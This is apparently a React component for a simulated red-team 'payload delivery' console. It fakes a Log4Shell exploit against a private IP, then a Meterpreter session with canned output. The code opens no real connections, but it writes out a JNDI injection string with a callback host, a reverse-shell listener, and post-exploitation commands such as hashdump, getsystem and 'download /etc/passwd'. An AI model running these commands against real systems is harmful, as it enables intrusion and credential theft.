import { useState, useEffect, useRef } from 'react';
import { Package, Send, Terminal, Zap, CheckCircle, AlertCircle, Cpu, Activity } from 'lucide-react';
import { mockExploits, mockPayloads, mockTargets } from '../data/mockData';

type SessionStatus = 'idle' | 'connecting' | 'exploiting' | 'success' | 'failed';

interface Session {
  id: number;
  target: string;
  exploit: string;
  payload: string;
  opened: string;
  uid: string;
  pid: number;
  hostname: string;
}

const postExploitCommands = [
  'sysinfo', 'getuid', 'getsystem', 'hashdump',
  'ipconfig', 'route', 'arp', 'ps',
  'upload /root/tools/linpeas.sh /tmp/',
  'shell', 'download /etc/passwd',
];

export default function PayloadDelivery() {
  const [target] = useState(mockTargets[1]);
  const [exploit] = useState(mockExploits[2]);
  const [payload] = useState(mockPayloads[2]);
  const [status, setStatus] = useState<SessionStatus>('idle');
  const [sessions, setSessions] = useState<Session[]>([]);
  const [termLog, setTermLog] = useState<string[]>([
    '  ╔══════════════════════════════════════════╗',
    '  ║     REDTEAM AI — DELIVERY CONSOLE v1.0   ║',
    '  ╚══════════════════════════════════════════╝',
    '',
    '[*] exploit/multi/http/log4shell_header_injection loaded',
    '[*] PAYLOAD: linux/x64/meterpreter/reverse_tcp',
    '[*] Checking target: 192.168.1.25:8080...',
    '[*] Awaiting operator command.',
  ]);
  const [cmd, setCmd] = useState('');
  const [activeSession, setActiveSession] = useState<Session | null>(null);
  const [listeners, setListeners] = useState([{ port: 4444, payload: 'linux/x64/meterpreter/reverse_tcp', status: 'listening' }]);
  const termRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (termRef.current) {
      termRef.current.scrollTop = termRef.current.scrollHeight;
    }
  }, [termLog]);

  function addLog(lines: string[]) {
    setTermLog(prev => [...prev, ...lines]);
  }

  function launchExploit() {
    setStatus('connecting');
    addLog([
      '',
      `[*] Started reverse TCP handler on 10.0.0.1:4444`,
      `[*] Setting up listener...`,
      `[*] Sending exploit payload to ${target.ip}:8080`,
    ]);
    setTimeout(() => {
      setStatus('exploiting');
      addLog([
        `[*] Injecting JNDI payload via User-Agent header`,
        `[*] JNDI: ldap://10.0.0.1:1389/Exploit`,
        `[*] Waiting for callback...`,
        `[*] Incoming connection from ${target.ip}:49521`,
      ]);
    }, 1200);
    setTimeout(() => {
      setStatus('success');
      const s: Session = {
        id: sessions.length + 1,
        target: target.ip,
        exploit: exploit.name,
        payload: payload.name,
        opened: new Date().toLocaleTimeString(),
        uid: 'www-data',
        pid: Math.floor(Math.random() * 30000 + 10000),
        hostname: target.hostname,
      };
      setSessions(prev => [...prev, s]);
      setActiveSession(s);
      addLog([
        ``,
        `[+] Meterpreter session ${s.id} opened (10.0.0.1:4444 → ${target.ip}:49521) at ${s.opened}`,
        ``,
        `meterpreter > `,
      ]);
    }, 3000);
  }

  function sendCmd(c: string) {
    if (!c.trim()) return;
    addLog([`meterpreter > ${c}`]);
    setCmd('');
    setTimeout(() => {
      const responses: Record<string, string[]> = {
        sysinfo: [
          `Computer        : ${target.hostname}`,
          `OS              : Ubuntu 20.04.6 LTS (Linux 5.4.0-169-generic)`,
          `Architecture    : x64`,
          `Meterpreter     : x64/linux`,
        ],
        getuid: [`Server username: www-data (uid=33, gid=33)`],
        getsystem: [`[-] Already running as SYSTEM`, `[*] Attempting local privilege escalation...`, `[+] Got system via technique 1 (CVE-2023-4911 Looney Tunables)`],
        hashdump: [
          `root:$6$rAndOm$abc123...REDACTED`,
          `www-data:$6$TkP82/x$def456...REDACTED`,
          `ubuntu:$6$Salt$ghi789...REDACTED`,
        ],
        ipconfig: [
          `Interface 1 (lo): 127.0.0.1 / 255.0.0.0`,
          `Interface 2 (eth0): 192.168.1.25 / 255.255.255.0`,
          `Interface 3 (docker0): 172.17.0.1 / 255.255.0.0`,
        ],
        ps: [`1234  www-data  /usr/bin/java -jar app.jar`, `5678  root  /usr/sbin/cron`, `9012  ubuntu  sshd`],
        shell: [`[*] Shell (*): /bin/bash`, `Process 12345 created.`, `Channel 1 created.`, `root@LINUX-WEB-01:/var/www/html# `],
      };
      const resp = responses[c.trim().toLowerCase()] || [`[*] Executing: ${c}`, `[*] Command complete.`];
      addLog(resp);
      addLog([``, `meterpreter > `]);
    }, 400);
  }

  return (
    <div className="space-y-5">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-cyan-400 font-mono tracking-wider flex items-center gap-3">
            <Package size={24} />
            PAYLOAD DELIVERY
          </h1>
          <p className="text-gray-600 text-sm font-mono mt-1">Exploit staging, delivery & post-exploitation console</p>
        </div>
        {status === 'success' && (
          <div className="flex items-center gap-2 bg-green-900/20 border border-green-700/50 px-4 py-2 rounded">
            <CheckCircle size={16} className="text-green-400" />
            <span className="text-green-400 text-xs font-mono font-bold">{sessions.length} SESSION(S) ACTIVE</span>
          </div>
        )}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-5">
        {/* Left panel: config */}
        <div className="space-y-4">
          {/* Target info */}
          <div className="bg-[#0d1117] border border-cyan-900/30 rounded-lg p-4">
            <div className="text-xs text-gray-600 font-mono tracking-wider uppercase mb-3">Target</div>
            <div className="space-y-1.5 text-xs font-mono">
              <div className="flex justify-between"><span className="text-gray-600">IP</span><span className="text-cyan-400">{target.ip}</span></div>
              <div className="flex justify-between"><span className="text-gray-600">Host</span><span className="text-white">{target.hostname}</span></div>
              <div className="flex justify-between"><span className="text-gray-600">OS</span><span className="text-gray-400">{target.os}</span></div>
              <div className="flex justify-between"><span className="text-gray-600">Port</span><span className="text-orange-400">8080</span></div>
            </div>
          </div>

          {/* Exploit info */}
          <div className="bg-[#0d1117] border border-orange-900/30 rounded-lg p-4">
            <div className="text-xs text-gray-600 font-mono tracking-wider uppercase mb-3">Exploit</div>
            <div className="text-xs font-mono text-cyan-400 break-all">{exploit.name}</div>
            <div className="text-xs font-mono text-gray-600 mt-1">{exploit.cve}</div>
            <div className="mt-2 text-xs text-green-400 font-mono">Rank: {exploit.rank}</div>
          </div>

          {/* Payload info */}
          <div className="bg-[#0d1117] border border-purple-900/30 rounded-lg p-4">
            <div className="text-xs text-gray-600 font-mono tracking-wider uppercase mb-3">Payload</div>
            <div className="text-xs font-mono text-green-400 break-all">{payload.name}</div>
            <div className="text-xs font-mono text-gray-600 mt-1">{payload.platform}/{payload.arch}</div>
            <div className="text-xs font-mono text-gray-600 mt-1">{payload.size} bytes</div>
          </div>

          {/* Listeners */}
          <div className="bg-[#0d1117] border border-cyan-900/30 rounded-lg p-4">
            <div className="text-xs text-gray-600 font-mono tracking-wider uppercase mb-3">Listeners</div>
            {listeners.map((l, i) => (
              <div key={i} className="flex items-center gap-2 text-xs font-mono">
                <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse flex-shrink-0"></span>
                <span className="text-green-400">:{l.port}</span>
                <span className="text-gray-700 text-xs">{l.payload.split('/').pop()}</span>
              </div>
            ))}
          </div>

          {/* Launch button */}
          <button
            onClick={launchExploit}
            disabled={status === 'connecting' || status === 'exploiting' || status === 'success'}
            className={`w-full flex items-center justify-center gap-2 py-3 rounded font-mono text-sm font-bold transition-all border ${
              status === 'success' ? 'bg-green-900/30 text-green-400 border-green-700 cursor-not-allowed' :
              status === 'connecting' || status === 'exploiting' ? 'bg-yellow-900/30 text-yellow-400 border-yellow-700 cursor-wait' :
              'bg-red-900/30 text-red-400 border-red-700 hover:bg-red-800/40'
            }`}
          >
            {status === 'idle' && <><Send size={16} />LAUNCH EXPLOIT</>}
            {(status === 'connecting' || status === 'exploiting') && <><Activity size={16} className="animate-pulse" />DELIVERING...</>}
            {status === 'success' && <><CheckCircle size={16} />SESSION OPEN</>}
            {status === 'failed' && <><AlertCircle size={16} />FAILED — RETRY</>}
          </button>
        </div>

        {/* Right: Terminal */}
        <div className="lg:col-span-3 bg-black rounded-lg border border-cyan-900/40 flex flex-col">
          <div className="flex items-center gap-3 px-4 py-2 border-b border-cyan-900/30 bg-[#0a0e1a] rounded-t-lg">
            <Terminal size={14} className="text-cyan-400" />
            <span className="text-xs font-mono text-cyan-400">REDTEAM CONSOLE</span>
            <div className="ml-auto flex items-center gap-2">
              {activeSession && (
                <span className="text-xs font-mono text-green-400">
                  Session {activeSession.id} — {activeSession.target} [{activeSession.uid}]
                </span>
              )}
              <span className={`w-2 h-2 rounded-full ${status === 'success' ? 'bg-green-500 animate-pulse' : status === 'idle' ? 'bg-gray-700' : 'bg-yellow-500 animate-pulse'}`}></span>
            </div>
          </div>

          <div
            ref={termRef}
            className="flex-1 p-4 font-mono text-xs overflow-y-auto text-green-400 space-y-0.5 min-h-96 max-h-[500px]"
            style={{ background: '#020408' }}
          >
            {termLog.map((line, i) => (
              <div key={i} className={`
                ${line.startsWith('[+]') ? 'text-green-400' :
                  line.startsWith('[-]') ? 'text-red-400' :
                  line.startsWith('[*]') ? 'text-cyan-400' :
                  line.startsWith('[!]') ? 'text-orange-400' :
                  line.startsWith('meterpreter') ? 'text-yellow-300' :
                  line.startsWith('root@') ? 'text-red-300' :
                  'text-gray-400'}
              `}>{line || '\u00A0'}</div>
            ))}
          </div>

          {status === 'success' && (
            <div className="border-t border-cyan-900/30 p-3 flex items-center gap-2">
              <span className="text-yellow-300 text-xs font-mono flex-shrink-0">meterpreter ></span>
              <input
                type="text"
                value={cmd}
                onChange={e => setCmd(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && sendCmd(cmd)}
                placeholder="Enter command..."
                className="flex-1 bg-transparent text-green-400 text-xs font-mono focus:outline-none placeholder-gray-700"
                autoFocus
              />
              <button onClick={() => sendCmd(cmd)} className="text-cyan-400 text-xs font-mono hover:text-cyan-300">
                <Send size={12} />
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Quick commands */}
      {status === 'success' && (
        <div className="bg-[#0d1117] border border-cyan-900/30 rounded-lg p-4">
          <div className="flex items-center gap-2 mb-3">
            <Cpu size={14} className="text-cyan-400" />
            <span className="text-xs font-mono text-cyan-400 tracking-wider uppercase">Post-Exploitation Quick Commands</span>
          </div>
          <div className="flex flex-wrap gap-2">
            {postExploitCommands.map(c => (
              <button
                key={c}
                onClick={() => sendCmd(c)}
                className="px-3 py-1.5 bg-black/50 text-cyan-400 border border-cyan-900/40 rounded text-xs font-mono hover:bg-cyan-900/20 transition-all hover:border-cyan-700"
              >
                {c}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Sessions table */}
      {sessions.length > 0 && (
        <div className="bg-[#0d1117] border border-cyan-900/30 rounded-lg p-4">
          <div className="flex items-center gap-2 mb-3">
            <Zap size={14} className="text-green-400" />
            <span className="text-xs font-mono text-green-400 tracking-wider uppercase">Active Sessions</span>
          </div>
          <table className="w-full text-xs font-mono">
            <thead>
              <tr className="text-gray-600 border-b border-gray-800">
                {['ID', 'TARGET', 'UID', 'HOSTNAME', 'EXPLOIT', 'PAYLOAD', 'OPENED'].map(h => (
                  <th key={h} className="text-left py-2 px-3">{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {sessions.map(s => (
                <tr key={s.id} className="border-b border-gray-800/30 hover:bg-cyan-900/10 cursor-pointer" onClick={() => setActiveSession(s)}>
                  <td className="py-2 px-3 text-green-400 font-bold">{s.id}</td>
                  <td className="py-2 px-3 text-cyan-400">{s.target}</td>
                  <td className="py-2 px-3 text-orange-400">{s.uid}</td>
                  <td className="py-2 px-3 text-white">{s.hostname}</td>
                  <td className="py-2 px-3 text-gray-500">{s.exploit.split('/').pop()}</td>
                  <td className="py-2 px-3 text-purple-400">{s.payload.split('/').pop()}</td>
                  <td className="py-2 px-3 text-gray-600">{s.opened}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
